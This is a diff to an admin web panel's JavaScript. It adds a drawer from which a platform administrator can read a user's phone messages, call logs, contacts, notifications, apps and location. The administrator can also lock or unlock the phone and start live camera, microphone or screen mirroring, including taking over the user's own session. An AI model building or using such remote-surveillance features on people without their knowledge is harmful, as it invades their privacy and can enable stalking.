@@ -7,6 +7,7 @@ import {
   signInWithEmailAndPassword,
   signOut,
 } from "https://www.gstatic.com/firebasejs/11.7.3/firebase-auth.js";
+import { startAdminLiveViewer } from "./live.js?v=2";
 
 const viewLogin = document.getElementById("view-login");
 const viewDenied = document.getElementById("view-denied");
@@ -19,10 +20,16 @@ const deniedEmail = document.getElementById("denied-email");
 let idToken = "";
 /** @type {import("https://www.gstatic.com/firebasejs/11.7.3/firebase-auth.js").Auth | null} */
 let auth = null;
+/** @type {object | null} */
+let firebaseConfig = null;
 /** @type {string} */
 let activeTab = "dashboard";
 /** @type {object[]} */
 let cachedUsers = [];
+/** @type {{ stop: () => Promise<void> } | null} */
+let liveViewer = null;
+/** @type {{ ownerUid: string, deviceId: string, data: object } | null} */
+let exploreCtx = null;
 
 function show(el, on) {
   if (!el) return;
@@ -39,6 +46,15 @@ function fmtTime(ms) {
   }
 }
 
+class ApiError extends Error {
+  constructor(message, code, howTo, extra) {
+    super(message);
+    this.code = code || "";
+    this.howTo = howTo || "";
+    this.extra = extra || null;
+  }
+}
+
 async function api(path, options = {}) {
   if (!idToken) throw new Error("Not signed in");
   const res = await fetch(path, {
@@ -51,9 +67,21 @@ async function api(path, options = {}) {
   });
   const data = await res.json().catch(() => ({}));
   if (!res.ok) {
-    throw new Error(data.error || data.message || `HTTP ${res.status}`);
+    throw new ApiError(
+      data.error || data.message || `HTTP ${res.status}`,
+      data.code || "",
+      data.howTo || "",
+      data
+    );
   }
   return data;
+}
+
+function formatApiError(e) {
+  if (e instanceof ApiError) {
+    return e.howTo ? `${e.message}\n\nHow: ${e.howTo}` : e.message;
+  }
+  return e instanceof Error ? e.message : String(e);
 }
 
 function setTab(tab) {
@@ -175,6 +203,13 @@ function closeDrawer() {
   show(document.getElementById("user-drawer"), false);
 }
 
+function wireDeviceDrawer() {
+  document.getElementById("btn-device-drawer-close")?.addEventListener("click", closeDeviceDrawer);
+  document.getElementById("device-drawer")?.addEventListener("click", (ev) => {
+    if (ev.target === document.getElementById("device-drawer")) closeDeviceDrawer();
+  });
+}
+
 async function openUser(uid) {
   if (!uid) return;
   const drawer = document.getElementById("user-drawer");
@@ -226,12 +261,18 @@ async function openUser(uid) {
     if (body) {
       body.innerHTML = `
         <h3>Devices</h3>
+        <p class="muted">Open a device to explore data and control it (does not revoke user browsers).</p>
         ${
           devices.length
             ? `<ul>${devices
                 .map(
                   (d) =>
-                    `<li><strong>${escapeHtml(d.deviceName || d.deviceId)}</strong> — ${escapeHtml(d.deviceModel || "")} · ${d.online ? "online" : "offline"} · app ${escapeHtml(d.appVersion || "?")} ${d.revoked ? "· revoked" : ""}</li>`
+                    `<li style="margin-bottom:10px;">
+                      <strong>${escapeHtml(d.deviceName || d.deviceId)}</strong> — ${escapeHtml(d.deviceModel || "")} · ${d.online ? "online" : "offline"} · app ${escapeHtml(d.appVersion || "?")} ${d.revoked ? "· revoked" : ""}
+                      <div style="margin-top:6px;">
+                        <button type="button" class="btn-primary btn-explore-device" data-uid="${escapeHtml(uid)}" data-device="${escapeHtml(d.deviceId)}" ${d.revoked ? "disabled" : ""}>Explore &amp; control</button>
+                      </div>
+                    </li>`
                 )
                 .join("")}</ul>`
             : `<p>No devices registered.</p>`
@@ -242,7 +283,7 @@ async function openUser(uid) {
             ? `<ul>${clients
                 .map(
                   (c) =>
-                    `<li>${escapeHtml(c.label || c.clientId)} — ${escapeHtml(c.browserName || "")} / ${escapeHtml(c.operatingSystem || "")} ${c.revoked ? "· revoked" : ""}</li>`
+                    `<li>${escapeHtml(c.label || c.clientId)} — ${escapeHtml(c.browserName || "")} / ${escapeHtml(c.operatingSystem || "")} ${c.revoked ? "· revoked" : ""}${c.clientId === "platform_admin" || c.isPlatformAdminClient ? " · <em>admin</em>" : ""}</li>`
                 )
                 .join("")}</ul>`
             : `<p>No trusted browsers.</p>`
@@ -274,9 +315,260 @@ async function openUser(uid) {
             : ""
         }
       `;
+      body.querySelectorAll(".btn-explore-device").forEach((btn) => {
+        btn.addEventListener("click", () => {
+          void openDeviceExplore(btn.getAttribute("data-uid"), btn.getAttribute("data-device"));
+        });
+      });
     }
   } catch (e) {
     if (body) body.textContent = e instanceof Error ? e.message : String(e);
+  }
+}
+
+function closeDeviceDrawer() {
+  void stopLiveViewer();
+  show(document.getElementById("device-drawer"), false);
+  exploreCtx = null;
+}
+
+async function stopLiveViewer() {
+  if (liveViewer) {
+    try {
+      await liveViewer.stop();
+    } catch {
+      /* ignore */
+    }
+    liveViewer = null;
+  }
+}
+
+async function openDeviceExplore(ownerUid, deviceId) {
+  if (!ownerUid || !deviceId) return;
+  const drawer = document.getElementById("device-drawer");
+  const body = document.getElementById("device-drawer-body");
+  const title = document.getElementById("device-drawer-title");
+  const sub = document.getElementById("device-drawer-sub");
+  show(drawer, true);
+  if (body) body.textContent = "Loading device…";
+  try {
+    const data = await api(
+      `/api/admin/users/${encodeURIComponent(ownerUid)}/devices/${encodeURIComponent(deviceId)}`
+    );
+    exploreCtx = { ownerUid, deviceId, data };
+    const d = data.device || {};
+    if (title) title.textContent = d.deviceName || deviceId;
+    if (sub) {
+      sub.textContent = `${d.deviceModel || ""} · ${d.online ? "online" : "offline"} · ${ownerUid}`;
+    }
+    renderDeviceExplore("overview");
+  } catch (e) {
+    if (body) body.textContent = formatApiError(e);
+  }
+}
+
+function renderDeviceExplore(tab) {
+  const body = document.getElementById("device-drawer-body");
+  if (!body || !exploreCtx) return;
+  const { ownerUid, deviceId, data } = exploreCtx;
+  const d = data.device || {};
+  const tabs = [
+    ["overview", "Overview"],
+    ["live", "Live"],
+    ["controls", "Controls"],
+    ["messages", "Messages"],
+    ["calls", "Call logs"],
+    ["contacts", "Contacts"],
+    ["notifications", "Notifications"],
+    ["apps", "Apps"],
+    ["limits", "What’s possible"],
+  ];
+  const tabBar = tabs
+    .map(
+      ([id, label]) =>
+        `<button type="button" data-dtab="${id}" class="${id === tab ? "active" : ""}">${label}</button>`
+    )
+    .join("");
+
+  let panel = "";
+  if (tab === "overview") {
+    panel = `
+      <div class="admin-cmd-row">
+        <button type="button" class="btn-secondary" id="btn-dev-refresh">Refresh data</button>
+        <button type="button" class="btn-secondary" id="btn-dev-sync-info">Sync device info</button>
+        <button type="button" class="btn-secondary" id="btn-dev-sync-loc">Request location</button>
+      </div>
+      <p id="device-action-status" class="muted" aria-live="polite"></p>
+      <h3>Device</h3>
+      <pre class="admin-pre">${escapeHtml(JSON.stringify(d, null, 2))}</pre>
+      <h3>Device info (cached)</h3>
+      <pre class="admin-pre">${escapeHtml(JSON.stringify(data.deviceInfo || { note: "No cached info — tap Sync device info" }, null, 2))}</pre>
+      <h3>Location (cached)</h3>
+      <pre class="admin-pre">${escapeHtml(JSON.stringify(data.location || { note: "No cached location — tap Request location" }, null, 2))}</pre>
+      <h3>Active sessions</h3>
+      <pre class="admin-pre">${escapeHtml(JSON.stringify(data.activeSessions || [], null, 2))}</pre>
+    `;
+  } else if (tab === "live") {
+    panel = `
+      <p class="muted">Starts live media via Platform Admin client. User browsers stay paired. Screen capture still needs Android system consent on the phone.</p>
+      <div class="admin-cmd-row">
+        <button type="button" class="btn-primary" id="btn-live-cam">Start camera + mic</button>
+        <button type="button" class="btn-secondary" id="btn-live-screen">Start screen mirror</button>
+        <button type="button" class="btn-danger-soft" id="btn-live-stop">Stop live</button>
+      </div>
+      <p id="live-status" class="muted" aria-live="polite"></p>
+      <video id="admin-live-video" class="admin-live-video" autoplay playsinline muted></video>
+    `;
+  } else if (tab === "controls") {
+    panel = `
+      <p class="muted">These commands do not revoke user browsers. They may briefly wake the phone app.</p>
+      <div class="admin-cmd-row">
+        <button type="button" class="btn-secondary" data-action="DEVICE_INFO_REFRESH">Sync info</button>
+        <button type="button" class="btn-secondary" data-action="LOCATION_GET_CURRENT">Location now</button>
+        <button type="button" class="btn-secondary" data-action="MESSAGES_SYNC">Sync messages</button>
+        <button type="button" class="btn-secondary" data-action="CALL_LOGS_SYNC">Sync call logs</button>
+        <button type="button" class="btn-secondary" data-action="CONTACTS_SYNC">Sync contacts</button>
+        <button type="button" class="btn-secondary" data-action="NOTIFICATIONS_SYNC">Sync notifications</button>
+        <button type="button" class="btn-secondary" data-action="APPS_INDEX">Sync apps</button>
+        <button type="button" class="btn-secondary" data-action="SCREEN_LOCK">Lock screen</button>
+        <button type="button" class="btn-secondary" data-action="SCREEN_UNLOCK">Unlock / wake</button>
+      </div>
+      <p id="device-action-status" class="muted" aria-live="polite"></p>
+      <p class="muted">Remote touch / accessibility: use the user’s website with their paired browser if deep remote control is already set up, or enable Accessibility on the phone then use A11y commands from a future admin build. Lock/unlock and sync work from here without extra pairing.</p>
+    `;
+  } else if (tab === "messages") {
+    panel = listPanel("Messages", data.messages, "Sync messages from Controls if empty.");
+  } else if (tab === "calls") {
+    panel = listPanel("Call logs", data.callLogs, "Sync call logs from Controls if empty.");
+  } else if (tab === "contacts") {
+    panel = listPanel("Contacts", data.contacts, "Sync contacts from Controls if empty.");
+  } else if (tab === "notifications") {
+    panel = listPanel("Notifications", data.notifications, "Sync notifications from Controls if empty.");
+  } else if (tab === "apps") {
+    panel = listPanel("Installed apps", data.apps, "Sync apps from Controls if empty.");
+  } else if (tab === "limits") {
+    panel = `<h3>What’s possible</h3>${(data.limitations || [])
+      .map(
+        (l) => `<div class="admin-limit-card">
+          <strong>${escapeHtml(l.feature)} — ${l.possible ? "Possible" : "Blocked"}</strong>
+          <span class="muted">${escapeHtml(l.note)}</span>
+        </div>`
+      )
+      .join("")}`;
+  }
+
+  body.innerHTML = `<div class="admin-device-tabs">${tabBar}</div><div>${panel}</div>`;
+  body.querySelectorAll("[data-dtab]").forEach((btn) => {
+    btn.addEventListener("click", () => renderDeviceExplore(btn.getAttribute("data-dtab") || "overview"));
+  });
+
+  document.getElementById("btn-dev-refresh")?.addEventListener("click", () => {
+    void openDeviceExplore(ownerUid, deviceId);
+  });
+  document.getElementById("btn-dev-sync-info")?.addEventListener("click", () => {
+    void runDeviceCommand(ownerUid, deviceId, "DEVICE_INFO_REFRESH");
+  });
+  document.getElementById("btn-dev-sync-loc")?.addEventListener("click", () => {
+    void runDeviceCommand(ownerUid, deviceId, "LOCATION_GET_CURRENT");
+  });
+  body.querySelectorAll("[data-action]").forEach((btn) => {
+    btn.addEventListener("click", () => {
+      void runDeviceCommand(ownerUid, deviceId, btn.getAttribute("data-action"));
+    });
+  });
+  document.getElementById("btn-live-cam")?.addEventListener("click", () => {
+    void startLive(ownerUid, deviceId, ["camera", "microphone"], false);
+  });
+  document.getElementById("btn-live-screen")?.addEventListener("click", () => {
+    void startLive(ownerUid, deviceId, ["screenMirror"], false);
+  });
+  document.getElementById("btn-live-stop")?.addEventListener("click", async () => {
+    await stopLiveViewer();
+    const st = document.getElementById("live-status");
+    if (st) st.textContent = "Live viewer stopped.";
+  });
+}
+
+function listPanel(title, items, emptyHint) {
+  const arr = Array.isArray(items) ? items : [];
+  if (!arr.length) {
+    return `<h3>${escapeHtml(title)}</h3><p class="muted">${escapeHtml(emptyHint)}</p>`;
+  }
+  return `<h3>${escapeHtml(title)} (${arr.length})</h3><pre class="admin-pre">${escapeHtml(
+    JSON.stringify(arr.slice(0, 40), null, 2)
+  )}</pre>`;
+}
+
+async function runDeviceCommand(ownerUid, deviceId, action) {
+  const status =
+    document.getElementById("device-action-status") || document.getElementById("live-status");
+  try {
+    if (status) status.textContent = `Sending ${action}…`;
+    await api(
+      `/api/admin/users/${encodeURIComponent(ownerUid)}/devices/${encodeURIComponent(deviceId)}/command`,
+      { method: "POST", body: JSON.stringify({ action, payload: {} }) }
+    );
+    if (status) status.textContent = `${action} sent. Refresh in a few seconds for new cached data.`;
+  } catch (e) {
+    if (status) status.textContent = formatApiError(e);
+    else alert(formatApiError(e));
+  }
+}
+
+async function startLive(ownerUid, deviceId, capabilities, forceReplace) {
+  const status = document.getElementById("live-status");
+  const video = document.getElementById("admin-live-video");
+  try {
+    await stopLiveViewer();
+    if (status) status.textContent = "Starting live session…";
+    let result;
+    try {
+      result = await api(
+        `/api/admin/users/${encodeURIComponent(ownerUid)}/devices/${encodeURIComponent(deviceId)}/session/start`,
+        {
+          method: "POST",
+          body: JSON.stringify({ capabilities, forceReplace: Boolean(forceReplace) }),
+        }
+      );
+    } catch (e) {
+      if (e instanceof ApiError && e.code === "USER_SESSION_ACTIVE") {
+        const ok = confirm(
+          `${e.message}\n\n${e.howTo || ""}\n\nTake over now? (Ends their same-type live session only.)`
+        );
+        if (!ok) {
+          if (status) status.textContent = "Cancelled — user session left running.";
+          return;
+        }
+        result = await api(
+          `/api/admin/users/${encodeURIComponent(ownerUid)}/devices/${encodeURIComponent(deviceId)}/session/start`,
+          {
+            method: "POST",
+            body: JSON.stringify({ capabilities, forceReplace: true }),
+          }
+        );
+      } else {
+        throw e;
+      }
+    }
+    if (!firebaseConfig) throw new Error("Firebase config missing");
+    if (!video) throw new Error("Video element missing");
+    if (status) status.textContent = result.notes || "Connecting WebRTC…";
+    liveViewer = await startAdminLiveViewer({
+      firebaseConfig,
+      customToken: result.customToken,
+      ownerUid: result.ownerUid,
+      sessionId: result.sessionId,
+      iceServers: Array.isArray(result.iceServers)
+        ? result.iceServers
+        : result.iceServers?.iceServers || [],
+      videoEl: video,
+      onStatus: (m) => {
+        if (status) status.textContent = m;
+      },
+    });
+  } catch (e) {
+    if (status) status.textContent = formatApiError(e);
+    else alert(formatApiError(e));
   }
 }
 
@@ -317,6 +609,7 @@ async function main() {
   const cfgRes = await fetch("/api/config");
   if (!cfgRes.ok) throw new Error("Failed to load /api/config");
   const cfg = await cfgRes.json();
+  firebaseConfig = cfg.firebase;
   const app = initializeApp(cfg.firebase);
   auth = getAuth(app);
 
@@ -332,6 +625,7 @@ async function main() {
   document.getElementById("user-drawer")?.addEventListener("click", (ev) => {
     if (ev.target === document.getElementById("user-drawer")) closeDrawer();
   });
+  wireDeviceDrawer();
 
   document.getElementById("btn-admin-add")?.addEventListener("click", async () => {
     const input = document.getElementById("admin-email-input");
